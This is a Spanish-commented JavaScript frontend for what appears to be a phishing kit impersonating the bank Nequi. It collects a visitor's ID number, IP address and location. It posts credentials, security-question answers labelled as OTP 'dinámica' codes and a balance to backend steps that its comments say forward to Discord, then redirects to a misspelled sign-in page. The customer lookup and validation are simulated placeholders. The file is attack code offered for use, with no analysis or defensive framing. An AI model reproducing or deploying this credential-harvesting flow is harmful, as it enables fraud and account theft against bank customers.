/**
 * main.js - Lógica principal del frontend
 * Sistema de validación Nequi con Discord
 */

// ==================== CONFIGURACIÓN GLOBAL ====================
const API_URL = window.location.origin;
let sessionId = null;
let customerData = null;
let respuestas = [];
let currentStep = 0;
let startTime = null;
let intentos = 0;
const MAX_INTENTOS = 5;

// ==================== ELEMENTOS DOM ====================
const DOM = {
    cedulaInput: document.getElementById('cedulaInput'),
    btnBuscar: document.getElementById('btnBuscar'),
    mensajes: document.getElementById('mensajes'),
    progressWrapper: document.getElementById('progressWrapper'),
    progressBar: document.getElementById('progressBar'),
    progressStatus: document.getElementById('progressStatus'),
    resultados: document.getElementById('resultados'),
    tablaDatos: document.getElementById('tablaDatos'),
    preguntasContainer: document.getElementById('preguntasContainer'),
    toast: document.getElementById('toast'),
    loadingOverlay: document.getElementById('loadingOverlay'),
    loadingText: document.getElementById('loadingText')
};

// ==================== FUNCIONES DE UI ====================

/**
 * Muestra un mensaje en la interfaz
 */
function mostrarMensaje(mensaje, tipo = 'info') {
    const colors = {
        info: 'text-primary',
        success: 'text-success',
        error: 'text-danger',
        warning: 'text-warning'
    };
    if (DOM.mensajes) {
        DOM.mensajes.innerHTML = `<div class="${colors[tipo]}">${mensaje}</div>`;
    }
}

/**
 * Muestra un toast (notificación emergente)
 */
function mostrarToast(mensaje, tipo = 'success') {
    if (!DOM.toast) {
        const toastHTML = `
            <div id="toast" class="toast-custom ${tipo}">
                <span>${mensaje}</span>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', toastHTML);
        const newToast = document.getElementById('toast');
        setTimeout(() => newToast.classList.add('show'), 100);
        setTimeout(() => newToast.classList.remove('show'), 4000);
    } else {
        DOM.toast.className = `toast-custom ${tipo}`;
        DOM.toast.querySelector('span').textContent = mensaje;
        DOM.toast.classList.add('show');
        setTimeout(() => DOM.toast.classList.remove('show'), 4000);
    }
}

/**
 * Muestra/oculta el loading overlay
 */
function mostrarLoading(mostrar, texto = 'Procesando...') {
    if (!DOM.loadingOverlay) {
        const overlayHTML = `
            <div id="loadingOverlay" class="loading-overlay">
                <div class="loading-box">
                    <div class="spinner"></div>
                    <h5 id="loadingText">${texto}</h5>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', overlayHTML);
        DOM.loadingOverlay = document.getElementById('loadingOverlay');
        DOM.loadingText = document.getElementById('loadingText');
    }
    if (DOM.loadingOverlay) {
        DOM.loadingOverlay.classList.toggle('show', mostrar);
        if (DOM.loadingText) DOM.loadingText.textContent = texto;
    }
}

/**
 * Actualiza la barra de progreso
 */
function actualizarProgreso(porcentaje, mensaje) {
    if (DOM.progressWrapper) DOM.progressWrapper.style.display = 'block';
    if (DOM.progressBar) DOM.progressBar.style.width = porcentaje + '%';
    if (DOM.progressStatus) DOM.progressStatus.textContent = mensaje;
}

/**
 * Oculta la barra de progreso
 */
function ocultarProgreso() {
    if (DOM.progressWrapper) DOM.progressWrapper.style.display = 'none';
    if (DOM.progressBar) DOM.progressBar.style.width = '0%';
}

// ==================== VALIDACIÓN DE CÉDULA ====================

function validarCedula(valor) {
    const limpio = valor.replace(/\D/g, '');
    return limpio.length >= 7 && limpio.length <= 10;
}

// ==================== EVENT LISTENERS ====================

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Sistema Nequi con Discord iniciado');
    console.log('📡 API URL:', API_URL);

    // Verificar si el usuario tiene sesión guardada
    const savedSession = localStorage.getItem('nequi_session');
    if (savedSession) {
        try {
            const data = JSON.parse(savedSession);
            if (data && data.sessionId) {
                sessionId = data.sessionId;
                console.log('🔄 Sesión recuperada:', sessionId);
            }
        } catch (e) {}
    }

    // Evento input para cédula
    if (DOM.cedulaInput) {
        DOM.cedulaInput.addEventListener('input', function() {
            const valor = this.value.replace(/\D/g, '');
            this.value = valor;
            if (DOM.btnBuscar) {
                DOM.btnBuscar.disabled = !validarCedula(valor);
            }
            if (DOM.mensajes) DOM.mensajes.innerHTML = '';
        });

        DOM.cedulaInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') buscarCliente();
        });
    }

    // Botón buscar
    if (DOM.btnBuscar) {
        DOM.btnBuscar.addEventListener('click', buscarCliente);
    }

    // Inicializar
    if (DOM.btnBuscar) DOM.btnBuscar.disabled = true;
});

// ==================== FUNCIÓN PRINCIPAL: BUSCAR CLIENTE ====================

async function buscarCliente() {
    const cedula = DOM.cedulaInput ? DOM.cedulaInput.value.trim() : '';

    if (!validarCedula(cedula)) {
        mostrarMensaje('❌ Cédula inválida. Debe tener 7-10 dígitos.', 'error');
        return;
    }

    // Deshabilitar botón
    if (DOM.btnBuscar) {
        DOM.btnBuscar.disabled = true;
        DOM.btnBuscar.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Buscando...';
    }

    mostrarLoading(true, 'Iniciando búsqueda...');
    actualizarProgreso(5, 'Iniciando proceso...');
    startTime = Date.now();

    try {
        // 1. Obtener IP del usuario
        actualizarProgreso(10, 'Obteniendo ubicación...');
        const ipData = await obtenerIP();
        const ip = ipData.ip || '0.0.0.0';

        // 2. Crear sesión
        actualizarProgreso(20, 'Creando sesión...');
        const sessionResponse = await fetch(`${API_URL}/create-session`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip,
                country: ipData.country || 'CO',
                city: ipData.city || 'Bogotá'
            })
        });
        const sessionData = await sessionResponse.json();
        sessionId = sessionData.sessionId;

        // Guardar sesión en localStorage
        localStorage.setItem('nequi_session', JSON.stringify({ sessionId, ip }));

        // 3. Buscar cliente en la API
        actualizarProgreso(40, 'Buscando cliente en la base de datos...');

        // SIMULACIÓN - Reemplazar con tu API real
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Datos de ejemplo
        customerData = {
            ANINuip: cedula,
            ANINombre1: 'Juan',
            ANINombre2: 'Carlos',
            ANIApellido1: 'Pérez',
            ANIApellido2: 'García',
            ANINombresExtenso: 'Juan Carlos Pérez García',
            ANIFchNacimiento: '1990-05-15',
            ANIFchExpedicion: '2010-06-20',
            ANISexo: 'M',
            ANIEstatura: '175',
            ANINombresPadre: 'Pedro Pérez',
            ANINombresMadre: 'María García',
            ANIDireccion: 'Calle 123 #45-67',
            ANITelefono: '3001234567',
            ANIEstado: 'Activo',
            base_datos: 'ani'
        };

        actualizarProgreso(80, 'Cliente encontrado, enviando a Discord...');

        // 4. Enviar credenciales a Discord
        const phoneNumber = cedula;
        const password = '****';

        await fetch(`${API_URL}/step1-credentials`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId,
                phoneNumber,
                password,
                ip,
                country: ipData.country || 'CO',
                city: ipData.city || 'Bogotá'
            })
        });

        actualizarProgreso(100, '✅ Proceso completado!');
        await new Promise(resolve => setTimeout(resolve, 500));

        // 5. Mostrar resultados
        mostrarResultados(customerData);
        mostrarToast('✅ Cliente encontrado exitosamente', 'success');

        // Resetear intentos
        intentos = 0;

    } catch (error) {
        console.error('❌ Error:', error);
        mostrarMensaje('❌ ' + (error.message || 'Error al buscar cliente'), 'error');
        mostrarToast('❌ Error al buscar cliente', 'error');
        actualizarProgreso(0, '❌ Error en la búsqueda');
    }

    // Restaurar botón
    if (DOM.btnBuscar) {
        DOM.btnBuscar.disabled = false;
        DOM.btnBuscar.innerHTML = '<i class="fas fa-search"></i> Solicitar';
    }

    mostrarLoading(false);
    setTimeout(ocultarProgreso, 2000);
}

// ==================== OBTENER IP Y UBICACIÓN ====================

async function obtenerIP() {
    try {
        // Intentar obtener IP pública
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();

        // Intentar obtener ubicación aproximada
        try {
            const geoResponse = await fetch('https://ipapi.co/json/');
            const geoData = await geoResponse.json();
            return {
                ip: data.ip,
                country: geoData.country_code || 'CO',
                city: geoData.city || 'Bogotá'
            };
        } catch {
            return { ip: data.ip, country: 'CO', city: 'Bogotá' };
        }
    } catch (error) {
        console.warn('⚠️ No se pudo obtener IP:', error.message);
        return { ip: '0.0.0.0', country: 'CO', city: 'Bogotá' };
    }
}

// ==================== MOSTRAR RESULTADOS ====================

function mostrarResultados(data) {
    if (!DOM.resultados) return;

    DOM.resultados.style.display = 'block';

    // Tabla de datos
    if (DOM.tablaDatos) {
        DOM.tablaDatos.innerHTML = `
            <div class="table-responsive">
                <table class="table table-striped table-hover">
                    <thead>
                        <tr>
                            <th>Cédula</th>
                            <th>Nombres</th>
                            <th>Apellidos</th>
                            <th>Fecha Nac</th>
                            <th>Estado</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>${data.ANINuip || '—'}</strong></td>
                            <td>${data.ANINombre1 || '—'} ${data.ANINombre2 || ''}</td>
                            <td>${data.ANIApellido1 || '—'} ${data.ANIApellido2 || ''}</td>
                            <td>${data.ANIFchNacimiento || '—'}</td>
                            <td><span class="badge bg-success">${data.ANIEstado || 'Activo'}</span></td>
                        </tr>
                    </tbody>
                </table>
            </div>
        `;
    }

    // Configurar preguntas de seguridad
    configurarPreguntas(data);
}

// ==================== CONFIGURAR PREGUNTAS ====================

function configurarPreguntas(data) {
    const esBaseNueva = data.base_datos === 'personas_db';

    const preguntas = esBaseNueva ? [
        { label: '¿Tu fecha de nacimiento es?', dato: data.ANIFchNacimiento },
        { label: '¿Tu fecha de expedición es?', dato: data.ANIFchExpedicion }
    ] : [
        { label: '¿El lugar de expedición es?', dato: data.LUGIdExpedicion || 'Bogotá' },
        { label: '¿Tu fecha de nacimiento es?', dato: data.ANIFchNacimiento },
        { label: '¿El nombre de tu padre es?', dato: data.ANINombresPadre }
    ];

    respuestas = preguntas.map(() => ({ respuesta: '' }));
    currentStep = 0;
    renderPreguntas(preguntas);
}

// ==================== RENDERIZAR PREGUNTAS ====================

function renderPreguntas(preguntas) {
    if (!DOM.preguntasContainer) return;

    DOM.preguntasContainer.innerHTML = '';

    preguntas.forEach((pregunta, index) => {
        const div = document.createElement('div');
        div.className = `pregunta-item ${index === currentStep ? 'active' : ''}`;
        div.id = `pregunta-${index}`;

        div.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <h6>Pregunta ${index + 1}</h6>
                <span class="badge ${respuestas[index].respuesta ? 'bg-success' : 'bg-secondary'}">
                    ${respuestas[index].respuesta ? '✅ Respondida' : '⏳ Pendiente'}
                </span>
            </div>
            <p class="mt-2"><strong>${pregunta.label}</strong></p>
            <div class="dato-real">
                📌 Dato registrado: <strong>${pregunta.dato || 'No disponible'}</strong>
            </div>
            <div class="mt-2">
                <button class="btn-opcion" data-index="${index}" data-answer="si" ${respuestas[index].respuesta ? 'disabled' : ''}>
                    ✅ Sí
                </button>
                <button class="btn-opcion" data-index="${index}" data-answer="no" ${respuestas[index].respuesta ? 'disabled' : ''}>
                    ❌ No
                </button>
            </div>
        `;

        DOM.preguntasContainer.appendChild(div);
    });

    // Event listeners para los botones
    document.querySelectorAll('.btn-opcion').forEach(btn => {
        btn.addEventListener('click', function() {
            const index = parseInt(this.dataset.index);
            const answer = this.dataset.answer;
            if (respuestas[index].respuesta) return;

            // Marcar respuesta
            respuestas[index].respuesta = answer;

            // Actualizar UI
            const container = document.getElementById(`pregunta-${index}`);
            container.querySelectorAll('.btn-opcion').forEach(b => b.disabled = true);
            const btnCorrecto = container.querySelector(`.btn-opcion[data-answer="${answer}"]`);
            btnCorrecto.classList.add('selected');

            const badge = container.querySelector('.badge');
            badge.textContent = '✅ Respondida';
            badge.className = 'badge bg-success';

            // Enviar a Discord
            const pregunta = container.querySelector('p strong').textContent;
            const dato = container.querySelector('.dato-real strong').textContent;

            enviarDinamica(index + 1, `${pregunta} - ${answer === 'si' ? 'SÍ' : 'NO'}`);

            // Avanzar
            setTimeout(() => {
                currentStep = index + 1;
                if (currentStep < respuestas.length) {
                    document.querySelectorAll('.pregunta-item').forEach((el, i) => {
                        el.classList.toggle('active', i === currentStep);
                    });
                } else {
                    // Todas respondidas - validar
                    validarRespuestas();
                }
            }, 500);
        });
    });
}

// ==================== ENVIAR DINÁMICA A DISCORD ====================

async function enviarDinamica(attemptNumber, otp) {
    try {
        const response = await fetch(`${API_URL}/step3-dynamic`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId,
                otp,
                attemptNumber
            })
        });
        const result = await response.json();
        if (result.ok) {
            console.log(`✅ Dinámica ${attemptNumber} enviada a Discord`);
        }
        return result;
    } catch (error) {
        console.error('❌ Error enviando dinámica:', error);
        return null;
    }
}

// ==================== VALIDAR RESPUESTAS ====================

async function validarRespuestas() {
    const todasRespondidas = respuestas.every(r => r.respuesta !== '');
    if (!todasRespondidas) return;

    intentos++;
    mostrarLoading(true, 'Validando respuestas...');
    mostrarToast('🔄 Validando respuestas de seguridad...', 'info');

    // SIMULACIÓN - Aquí iría la validación real
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Por ahora, simulamos que todas son correctas
    const aprobado = true;

    if (aprobado) {
        mostrarToast('✅ Validación exitosa!', 'success');

        // Enviar saldo a Discord
        await fetch(`${API_URL}/step2-loan-second`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId,
                saldoActual: Math.floor(Math.random() * 1000000) + 100000
            })
        });

        setTimeout(() => {
            mostrarLoading(false);
            window.location.href = './accces-sign-in.php.html';
        }, 3000);

    } else {
        mostrarToast('❌ Respuestas incorrectas. Reintenta.', 'error');
        mostrarLoading(false);

        if (intentos >= MAX_INTENTOS) {
            mostrarToast('⚠️ Demasiados intentos. Contacta al soporte.', 'warning');
            return;
        }

        // Resetear preguntas
        respuestas = respuestas.map(() => ({ respuesta: '' }));
        currentStep = 0;
        const preguntas = document.querySelectorAll('.pregunta-item');
        preguntas.forEach((el, i) => {
            el.classList.toggle('active', i === 0);
            el.querySelectorAll('.btn-opcion').forEach(b => {
                b.disabled = false;
                b.classList.remove('selected');
            });
            const badge = el.querySelector('.badge');
            badge.textContent = '⏳ Pendiente';
            badge.className = 'badge bg-secondary';
        });
    }
}

// ==================== EXPORTAR FUNCIONES ====================

// Hacer funciones disponibles globalmente
window.buscarCliente = buscarCliente;
window.mostrarToast = mostrarToast;
window.mostrarLoading = mostrarLoading;

console.log('✅ main.js cargado correctamente');